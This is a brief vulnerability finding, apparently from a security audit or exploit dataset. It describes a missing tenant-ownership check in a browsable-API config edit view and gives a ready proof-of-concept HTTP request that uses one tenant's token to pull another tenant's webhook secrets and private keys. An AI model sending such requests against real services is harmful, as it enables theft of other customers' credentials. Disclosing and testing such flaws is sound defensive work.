diagnosis: TenantConfigBrowsableEditView loads a TenantAPIConfiguration instance by primary key without validating tenant ownership. When an attacker requests HTML format via the Browsable API, the view renders an HTML form containing pre-filled sensitive inputs (including production webhook secrets and API private keys) of any other tenant.
exploit_request:
GET /api/tenants/config/419/edit/ HTTP/1.1
Host: console.multitenantapi.io
Authorization: Bearer tenant_b_key
Accept: text/html
